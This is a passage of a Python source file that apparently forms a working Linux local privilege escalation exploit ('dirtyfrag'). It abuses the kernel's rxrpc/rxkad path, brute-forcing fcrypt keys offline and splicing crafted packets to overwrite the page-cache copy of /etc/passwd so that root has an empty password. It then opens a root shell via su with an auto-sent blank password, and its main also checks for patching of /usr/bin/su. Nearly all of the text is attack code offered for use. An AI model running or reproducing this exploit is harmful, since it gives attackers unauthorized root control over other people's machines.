RXRPC_USER_CALL_ID        = 4
RXRPC_SECURITY_AUTH       = 2

RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_PACKET_TYPE_DATA      = 1
RXRPC_LAST_PACKET           = 0x04

# wire header: epoch,cid,callNumber,seq,serial : 5*u32 (20)
#              type,flags,userStatus,securityIndex: 4*u8 (4)
#              cksum, serviceId : 2*u16 (4)  -> total 28
RXRPC_WH_SIZE = 28
RXRPC_WH_FMT  = "=IIIII4sHH"

def _sockaddr_rxrpc(service, port):
    # sockaddr_rxrpc { u16 family; u16 service; u32 transport_type;
    #                  u16 transport_len; sockaddr_in ... }
    # Layout: family(2), service(2), transport_type(4), transport_len(2),
    #         sockaddr_in(16)
    return struct.pack("=HHIH H4s8x",
                       AF_RXRPC, service, socket.SOCK_DGRAM,
                       socket.AF_INET, socket.htons(port),
                       socket.inet_aton("127.0.0.1"))

# Minimal sockaddr_rxrpc:
def make_sockaddr_rxrpc(service, port):
    sin = struct.pack("=HHI4s8x", socket.AF_INET, socket.htons(port),
                      socket.inet_aton("127.0.0.1"), b"")
    return struct.pack("=HHIH", AF_RXRPC, service,
                       socket.SOCK_DGRAM, socket.AF_INET) + sin

def build_rxrpc_v1_token(key: bytes) -> bytes:
    now = int(time.time()) & 0xFFFFFFFF
    expires = (now + 86400) & 0xFFFFFFFF
    p = bytearray()
    p += struct.pack("=I", socket.htonl(0))              # flags
    cell = b"evil"
    p += struct.pack("=I", socket.htonl(len(cell)))
    p += cell
    p += b"\x00" * ((4 - (len(cell) & 3)) & 3)
    p += struct.pack("=I", socket.htonl(1))              # ntoken
    tokstart = len(p)
    p += struct.pack("=I", socket.htonl(2))              # sec_ix
    p += struct.pack("=I", socket.htonl(0))              # vice_id
    p += struct.pack("=I", socket.htonl(1))              # kvno
    p += key[:8]                                         # session key
    p += struct.pack("=I", socket.htonl(now))
    p += struct.pack("=I", socket.htonl(expires))
    p += struct.pack("=I", socket.htonl(1))              # primary_flag
    p += struct.pack("=I", socket.htonl(8))              # ticket_len
    p += b"\xCC" * 8
    toklen = len(p) - tokstart
    struct.pack_into("=I", p, tokstart - 4, socket.htonl(toklen))
    return bytes(p)

def add_rxrpc_key(desc, key: bytes):
    payload = build_rxrpc_v1_token(key)
    return add_key("rxrpc", desc, payload, len(payload), -2)  # -2 = process keyring

def setup_rxrpc_client(port, keyname):
    try:
        sock = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
    except OSError as e:
        return None
    try:
        sock.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEY,
                        keyname.encode() + b"\x00")
    except OSError:
        sock.close(); return None
    try:
        sock.setsockopt(SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
                        struct.pack("=i", RXRPC_SECURITY_AUTH))
    except OSError:
        sock.close(); return None
    # bind via raw sockaddr
    sa = make_sockaddr_rxrpc(0, port)
    try:
        libc.bind(sock.fileno(), sa, len(sa))
    except OSError:
        pass
    # bind() via Python needs a tuple; fallback: use ctypes bind
    return sock

def rxrpc_client_initiate_call(sock, srv_port, svc_id, user_call_id):
    data = b"PINGPING"
    sa = make_sockaddr_rxrpc(svc_id, srv_port)
    # nonblocking sendmsg
    fl = fcntl.fcntl(sock.fileno(), fcntl.F_GETFL)
    fcntl.fcntl(sock.fileno(), fcntl.F_SETFL, fl | os.O_NONBLOCK)
    try:
        # Ancillary: RXRPC_USER_CALL_ID
        cmsg = (SOL_RXRPC, RXRPC_USER_CALL_ID,
                struct.pack("=Q", user_call_id))
        sock.sendmsg([data], [cmsg], 0, sa)
        return 0
    except BlockingIOError:
        return 0
    except OSError as e:
        sys.stderr.write("[!] client sendmsg: %s\n" % e)
        return -1
    finally:
        fcntl.fcntl(sock.fileno(), fcntl.F_SETFL, fl)

# ===================================================================
#  Fake UDP server / rxrpc trigger
# ===================================================================
def setup_udp_server(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.bind(("127.0.0.1", port))
    except OSError:
        s.close(); return None
    return s

def udp_recv_to(sock, cap, timeout_ms):
    r, _, _ = select.select([sock], [], [], timeout_ms / 1000.0)
    if not r: return None, None
    data, addr = sock.recvfrom(cap)
    return data, addr

SESSION_KEY = bytearray(b"\x01\x02\x03\x04\x05\x06\x07\x08")
trigger_seq = [0]

def do_one_trigger(target_fd, splice_off, splice_len):
    kname = "evil%d" % trigger_seq[0]
    trigger_seq[0] += 1

    key = add_rxrpc_key(kname, bytes(SESSION_KEY))
    if key < 0:
        return -1

    port_S = 7777 + (trigger_seq[0] * 2 % 200)
    port_C = port_S + 1
    svc_id = 1234

    udp_srv = setup_udp_server(port_S)
    if not udp_srv:
        keyctl(KEYCTL_INVALIDATE, key); return -1

    rxsk_cli = setup_rxrpc_client(port_C, kname)
    if not rxsk_cli:
        udp_srv.close(); keyctl(KEYCTL_INVALIDATE, key); return -1

    if rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0:
        rxsk_cli.close(); udp_srv.close(); keyctl(KEYCTL_INVALIDATE, key); return -1

    pkt, cli_addr = udp_recv_to(udp_srv, 2048, 1500)
    if not pkt or len(pkt) < RXRPC_WH_SIZE:
        rxsk_cli.close(); udp_srv.close(); keyctl(KEYCTL_INVALIDATE, key); return -1

    epoch, cid, callN, _seq, _serial, _typeflags, svc_in = \
        struct.unpack_from("=IIIII4sH", pkt, 0)[:7]

    epoch = socket.ntohl(epoch)
    cid   = socket.ntohl(cid)
    callN = socket.ntohl(callN)
    svc_in = socket.ntohs(svc_in)
    cli_port = cli_addr[1]

    # Send CHALLENGE
    chdr = struct.pack("=IIIII4sHH",
                       socket.htonl(epoch), socket.htonl(cid),
                       0, 0, socket.htonl(0x10000),
                       bytes([RXRPC_PACKET_TYPE_CHALLENGE, 0, 0, 2]),
                       socket.htons(svc_in))
    ch = struct.pack("=IIII",
                     socket.htonl(2), socket.htonl(0xDEADBEEF),
                     socket.htonl(1), 0)
    udp_srv.sendto(chdr + ch, ("127.0.0.1", cli_port))

    # Drain responses
    for _ in range(4):
        pkt2, _ = udp_recv_to(udp_srv, 2048, 500)
        if not pkt2: break

    csum_iv = compute_csum_iv(epoch, cid, 2, bytes(SESSION_KEY))
    if not csum_iv:
        rxsk_cli.close(); udp_srv.close(); keyctl(KEYCTL_INVALIDATE, key); return -1
    cks = compute_cksum(cid, callN, 1, bytes(SESSION_KEY), csum_iv)
    if cks is None:
        rxsk_cli.close(); udp_srv.close(); keyctl(KEYCTL_INVALIDATE, key); return -1

    # Malicious DATA header
    mal = struct.pack("=IIIII4sHH",
                      socket.htonl(epoch), socket.htonl(cid),
                      socket.htonl(callN), socket.htonl(1),
                      socket.htonl(0x42000),
                      bytes([RXRPC_PACKET_TYPE_DATA, RXRPC_LAST_PACKET, 0, 2]),
                      socket.htons(cks), socket.htons(svc_in))

    udp_srv.connect(("127.0.0.1", cli_port))

    pfd_r, pfd_w = os.pipe()
    try:
        if _vmsplice_write(pfd_w, mal) != len(mal):
            raise OSError("vmsplice mal hdr")
        if _splice_file_to_pipe(target_fd, splice_off, pfd_w, splice_len) < 0:
            raise OSError("splice file")
        if _splice_pipe_to_sock(pfd_r, udp_srv.fileno(),
                                len(mal) + splice_len) < 0:
            raise OSError("splice pipe->sock")
    except OSError:
        os.close(pfd_r); os.close(pfd_w)
        rxsk_cli.close(); udp_srv.close()
        keyctl(KEYCTL_INVALIDATE, key); return -1
    os.close(pfd_r); os.close(pfd_w)

    # Trigger recvmsg
    fl = fcntl.fcntl(rxsk_cli.fileno(), fcntl.F_GETFL)
    fcntl.fcntl(rxsk_cli.fileno(), fcntl.F_SETFL, fl | os.O_NONBLOCK)
    try:
        for _ in range(5):
            try:
                rxsk_cli.recvmsg(2048)
                break
            except BlockingIOError:
                time.sleep(0.02)
            except OSError:
                break
    finally:
        fcntl.fcntl(rxsk_cli.fileno(), fcntl.F_SETFL, fl)

    rxsk_cli.close(); udp_srv.close()
    keyctl(KEYCTL_INVALIDATE, key)
    return 0

# ===================================================================
#  Predicados y búsqueda offline de K
# ===================================================================
def fc_check_pa(P): return P[0] == ord(':') and P[1] == ord(':')

def fc_check_pb(P): return P[0] == ord('0') and P[1] == ord(':')

def fc_check_pc(P):
    if P[0] != ord('0') or P[1] != ord(':') or P[7] != ord(':'): return False
    for i in range(2, 7):
        if P[i] in (ord(':'), 0, ord('\n')): return False
    return True

def splitmix64(state):
    state = (state + 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
    z = state
    z = ((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9) & 0xFFFFFFFFFFFFFFFF
    z = ((z ^ (z >> 27)) * 0x94D049BB133111EB) & 0xFFFFFFFFFFFFFFFF
    return z ^ (z >> 31), state

def find_K_offline(ct: bytes, max_iters, check_fn, seed_init, label):
    seed = seed_init
    t0 = time.time()
    for it in range(max_iters):
        r, seed = splitmix64(seed)
        K = struct.pack("=Q", r)
        sched = fcrypt_user_setkey(K)
        P = fcrypt_user_decrypt(sched, ct)
        if check_fn(P):
            dt = time.time() - t0
            sys.stderr.write(
                "[+] %s found after %d iters in %.2fs (%.2fM/s) "
                "K=%s P=%s\n" % (
                    label, it, dt, it / dt / 1e6 if dt > 0 else 0,
                    K.hex(), P.hex()))
            return K, P
        if (it & 0x3FFFFFF) == 0 and it > 0:
            dt = time.time() - t0
            sys.stderr.write("  [%s %.1fs] iter=%d (%.2fM/s)\n" %
                             (label, dt, it, it / dt / 1e6 if dt > 0 else 0))
    return None, None

# ===================================================================
#  rxrpc_lpe_main
# ===================================================================
def do_unshare_userns_netns():
    real_uid = os.getuid()
    real_gid = os.getgid()
    if libc.unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0:
        sys.stderr.write("[!] unshare: %s\n" %
                         os.strerror(ctypes.get_errno()))
        return -1
    write_proc("/proc/self/setgroups", "deny")
    write_proc("/proc/self/uid_map", f"{real_uid} {real_uid} 1")
    write_proc("/proc/self/gid_map", f"{real_gid} {real_gid} 1")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            buf = struct.pack("16sH14x", b"lo", 0)
            buf = fcntl.ioctl(s.fileno(), 0x8913, buf)
            flags = struct.unpack("16sH14x", buf)[1]
            flags |= 0x1 | 0x40
            fcntl.ioctl(s.fileno(), 0x8914, struct.pack("16sH14x", b"lo", flags))
        except OSError:
            pass
    finally:
        s.close()
    return 0

def _dump_line1(tag):
    fd = os.open("/etc/passwd", os.O_RDONLY)
    try:
        buf = os.pread(fd, 32, 0)
    finally:
        os.close(fd)
    out = []
    for c in buf:
        if c == ord('\n'): out.append('$')
        elif 32 <= c < 127: out.append(chr(c))
        else: out.append('.')
    sys.stderr.write("[*] /etc/passwd line 1 (%s): '%s'\n" % (tag, "".join(out)))

def rxrpc_lpe_main(argv):
    sys.stderr.write("\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 -> root) ===\n")
    sys.stderr.write("[*] uid=%u euid=%u gid=%u\n" %
                     (os.getuid(), os.geteuid(), os.getgid()))

    if not (os.environ.get("POC_NO_UNSHARE") == "1"):
        if os.environ.get("POC_UNSHARE") == "1":
            if do_unshare_userns_netns() < 0:
                return 1

    # Autoload rxrpc
    try:
        d = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
        d.close()
    except OSError as e:
        sys.stderr.write("[!] socket(AF_RXRPC): %s — module not loadable?\n" % e)
        return 1

    target = os.environ.get("POC_TARGET_FILE") or "/etc/passwd"

    try:
        rfd_ro = os.open(target, os.O_RDONLY)
    except OSError as e:
        sys.stderr.write("[!] open %s RO: %s\n" % (target, e))
        return 1

    try:
        st = os.fstat(rfd_ro)
        if st.st_size < 32:
            sys.stderr.write("[!] target too small: %d\n" % st.st_size)
            return 1
        try:
            mp = mmap.mmap(rfd_ro, 4096, access=mmap.ACCESS_READ)
        except OSError:
            mp = mmap.mmap(rfd_ro, st.st_size, access=mmap.ACCESS_READ)

        if bytes(mp[0:9]) == b"root::0:0":
            sys.stderr.write("[+] /etc/passwd already patched - nothing to do\n")
            return 0

        sys.stderr.write("[*] first 16 bytes: ")
        for i in range(16):
            sys.stderr.write("%02x " % mp[i])
        sys.stderr.write("\n")
        _dump_line1("BEFORE")

        Ca = bytes(mp[4:12])
        Cb = bytes(mp[6:14])
        Cc = bytes(mp[8:16])
        off_a, off_b, off_c = 4, 6, 8

        fcrypt_init_sboxes()

        # selftest
        z = b"\x00" * 8
        sched = fcrypt_user_setkey(z)
        assert fcrypt_user_decrypt(sched,
                                   bytes.fromhex("0E0900C73EF7ED41")) == z
        sys.stderr.write("[+] fcrypt selftest OK\n")

        max_iters = 10_000_000_000
        e = os.environ.get("LPE_MAX_ITERS")
        if e: max_iters = int(e, 0)
        seed_base = int(time.time() * 0x100000001) ^ os.getpid()
        se = os.environ.get("LPE_SEED")
        if se: seed_base = int(se, 0)

        sys.stderr.write("\n=== STAGE 1a: search K_A (chars 4-5 := \"::\") ===\n")
        Ka, Pa = find_K_offline(Ca, max_iters, fc_check_pa, seed_base, "K_A")
        if Ka is None: return 2

        Cb_actual = Pa[2:8] + Cb[6:8]
        sys.stderr.write("\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\") ===\n")
        Kb, Pb = find_K_offline(Cb_actual, max_iters, fc_check_pb,
                                seed_base ^ 0xA5A5A5A5A5A5A5A5, "K_B")
        if Kb is None: return 2

        Cc_actual = Pb[2:8] + Cc[6:8]
        sys.stderr.write("\n=== STAGE 1c: search K_C (chars 8-15) ===\n")
        Kc, Pc = find_K_offline(Cc_actual, max_iters, fc_check_pc,
                                seed_base ^ 0x5A5A5A5A5A5A5A5A, "K_C")
        if Kc is None: return 2

        # Three triggers
        SESSION_KEY[:] = Ka
        sys.stderr.write("\n=== STAGE 2a: kernel trigger A @ %d ===\n" % off_a)
        if do_one_trigger(rfd_ro, off_a, 8) < 0: return 3
        SESSION_KEY[:] = Kb
        sys.stderr.write("\n=== STAGE 2b: kernel trigger B @ %d ===\n" % off_b)
        if do_one_trigger(rfd_ro, off_b, 8) < 0: return 3
        SESSION_KEY[:] = Kc
        sys.stderr.write("\n=== STAGE 2c: kernel trigger C @ %d ===\n" % off_c)
        if do_one_trigger(rfd_ro, off_c, 8) < 0: return 3

        _dump_line1("AFTER")

        m = bytes(mp)
        ok = (m[4] == ord(':') and m[5] == ord(':') and
              m[6] == ord('0') and m[7] == ord(':') and
              m[8] == ord('0') and m[9] == ord(':') and
              m[15] == ord(':'))
        if not ok:
            sys.stderr.write("[!] post-trigger sanity check failed\n")
            return 4

        sys.stderr.write("[!!!] HIT - root entry patched (empty passwd)\n")

        # Sanity via getent
        try:
            out = subprocess.run(["getent", "passwd", "root"],
                                 capture_output=True, timeout=5)
            sys.stderr.write("[getent passwd root] %s\n" %
                             out.stdout.decode(errors="replace"))
        except Exception:
            pass

        # Honor --corrupt-only
        co = ("--corrupt-only" in argv) or \
             (os.environ.get("DIRTYFRAG_CORRUPT_ONLY") == "1")
        if co:
            return 0

        # STAGE 4 - launch su
        sys.stderr.write("\n=== STAGE 4: spawning root shell via su ===\n\n")
        sys.stderr.flush()
        return _run_su_pty()
    finally:
        os.close(rfd_ro)

def _run_su_pty():
    """Open PTY, fork, exec su, bridge stdin/stdout with auto-password."""
    master, slave = pty.openpty()
    try:
        ws = fcntl.ioctl(0, termios.TIOCGWINSZ, b"\x00" * 8)
        fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
    except OSError:
        pass

    pid = os.fork()
    if pid == 0:
        try:
            os.setsid()
            fd = os.open(os.ttyname(slave), os.O_RDWR)
            fcntl.ioctl(fd, termios.TIOCSCTTY, 0)
            os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2)
            if fd > 2: os.close(fd)
            os.close(master)
            try:
                os.execvp("su", ["su"])
            except OSError:
                os._exit(127)
        except Exception:
            os._exit(127)
    os.close(slave)

    # Save termios, set raw
    try:
        saved = termios.tcgetattr(0)
        tty.setraw(0)
    except Exception:
        saved = None

    auto_pw_sent = False
    stdin_eof = False
    auto_verify = os.environ.get("LPE_AUTO_VERIFY") == "1"
    verify_sent = False
    total_ms = 0
    buf = bytearray()

    try:
        while True:
            rfds = [master]
            if not stdin_eof:
                rfds.append(0)
            try:
                r, _, _ = select.select(rfds, [], [], 0.2)
            except InterruptedError:
                continue
            total_ms += 200

            if master in r:
                try:
                    chunk = os.read(master, 4096)
                except OSError:
                    break
                if not chunk: break
                os.write(1, chunk)
                buf.extend(chunk)
                if not auto_pw_sent and b"assword" in chunk:
                    os.write(master, b"\n")
                    auto_pw_sent = True

            if 0 in r:
                try:
                    chunk = os.read(0, 4096)
                except OSError:
                    chunk = b""
                if not chunk:
                    stdin_eof = True
                else:
                    os.write(master, chunk)

            if auto_verify and not verify_sent and total_ms >= 1000:
                os.write(master, b"id; whoami; exit\n")
                verify_sent = True

            try:
                wpid, status = os.waitpid(pid, os.WNOHANG)
                if wpid == pid:
                    for _ in range(5):
                        r2, _, _ = select.select([master], [], [], 0.05)
                        if not r2: break
                        try:
                            c = os.read(master, 4096)
                            if not c: break
                            os.write(1, c)
                        except OSError:
                            break
                    break
            except ChildProcessError:
                break
    finally:
        if saved is not None:
            try: termios.tcsetattr(0, termios.TCSANOW, saved)
            except Exception: pass
        try: os.close(master)
        except OSError: pass
    return 0

# ===================================================================
#  Chain main
# ===================================================================
su_marker = bytes([0x31, 0xFF, 0x31, 0xF6, 0x31, 0xC0, 0xB0, 0x6A])

def su_already_patched():
    try:
        fd = os.open("/usr/bin/su", os.O_RDONLY)
    except OSError:
        return False
    try:
        got = os.pread(fd, 8, 0x78)
        return got == su_marker
    finally:
        os.close(fd)

def passwd_already_patched():
    try:
        fd = os.open("/etc/passwd", os.O_RDONLY)
    except OSError:
        return False
    try:
        return os.pread(fd, 9, 0) == b"root::0:0"
    finally:
        os.close(fd)

def either_target_patched():
    return su_already_patched() or passwd_already_patched()

def run_root_pty():
    """Open PTY, fork, exec `su -`, bridge."""
    master, slave = pty.openpty()
    try:
        ws = fcntl.ioctl(0, termios.TIOCGWINSZ, b"\x00" * 8)
        fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
    except OSError:
        pass

    pid = os.fork()
    if pid == 0:
        try:
            os.setsid()
            fd = os.open(os.ttyname(slave), os.O_RDWR)
            fcntl.ioctl(fd, termios.TIOCSCTTY, 0)
            os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2)
            if fd > 2: os.close(fd)
            os.close(master)
            for p in ("/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"):
                try:
                    os.execv(p, ["su", "-"])
                except OSError:
                    continue
            try:
                os.execvp("su", ["su", "-"])
            except OSError:
                os._exit(127)
        except Exception:
            os._exit(127)
    os.close(slave)

    signal.signal(signal.SIGTTOU, signal.SIG_IGN)
    signal.signal(signal.SIGTTIN, signal.SIG_IGN)
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
    try: os.setpgid(0, 0)
    except OSError: pass
    try: os.tcsetpgrp(0, os.getpid())
    except OSError: pass

    try:
        saved = termios.tcgetattr(0)
        tty.setraw(0)
    except Exception:
        saved = None

    auto_pw_sent = False
    stdin_eof = False
    saw_output = False
    total_ms = 0

    try:
        while True:
            rfds = [master]
            if not stdin_eof:
                rfds.append(0)
            try:
                r, _, _ = select.select(rfds, [], [], 0.2)
            except InterruptedError:
                continue
            total_ms += 200

            if master in r:
                try: chunk = os.read(master, 4096)
                except OSError: break
                if not chunk: break
                saw_output = True
                os.write(1, chunk)
                if not auto_pw_sent and b"assword" in chunk:
                    os.write(master, b"\n"); auto_pw_sent = True

            if 0 in r:
                try: chunk = os.read(0, 4096)
                except OSError: chunk = b""
                if not chunk: stdin_eof = True
                else: os.write(master, chunk)

            if not auto_pw_sent and not saw_output and total_ms >= 1500:
                os.write(master, b"\n"); auto_pw_sent = True

            try:
                wpid, status = os.waitpid(pid, os.WNOHANG)
                if wpid == pid:
                    for _ in range(5):
                        r2, _, _ = select.select([master], [], [], 0.05)
                        if not r2: break
                        try:
                            c = os.read(master, 4096)
                            if not c: break
                            os.write(1, c)
                        except OSError: break
                    break
            except ChildProcessError:
                break
    finally:
        if saved is not None:
            try: termios.tcsetattr(0, termios.TCSANOW, saved)
            except Exception: pass
        try: os.close(master)
        except OSError: pass
    return 0

def main(argv):
    verbose = bool(os.environ.get("DIRTYFRAG_VERBOSE"))
    force_esp = force_rxrpc = False
    for a in argv[1:]:
        if a == "--force-esp":   force_esp = True
        elif a == "--force-rxrpc": force_rxrpc = True
        elif a in ("-v", "--verbose"): verbose = True

    if os.getuid() == 0:
        try:
            os.execv("/bin/bash", ["bash"])
        except OSError:
            return 1

    # Append --corrupt-only
    co_argv = list(argv) + ["--corrupt-only"]

    saved_err = None
    if not verbose:
        saved_err = os.dup(2)
        dn = os.open("/dev/null", os.O_WRONLY)
        os.dup2(dn, 2); os.close(dn)

    try:
        if force_rxrpc:
            rc = rxrpc_lpe_main(co_argv)
            for _ in range(3):
                if passwd_already_patched(): break
                rc = rxrpc_lpe_main(co_argv)
        elif force_esp:
            rc = su_lpe_main(co_argv)
        else:
            rc = su_lpe_main(co_argv)
            if not su_already_patched():
                rc = rxrpc_lpe_main(co_argv)
                for _ in range(3):
                    if passwd_already_patched(): break
                    rc = rxrpc_lpe_main(co_argv)
    finally:
        if saved_err is not None:
            os.dup2(saved_err, 2); os.close(saved_err)

    patched = either_target_patched()
    if patched:
        run_root_pty()
        return 0

    sys.stderr.write("dirtyfrag: failed (rc=%d)\n" % rc)
    return rc or 1

if __name__ == "__main__":
    sys.exit(main(sys.argv))
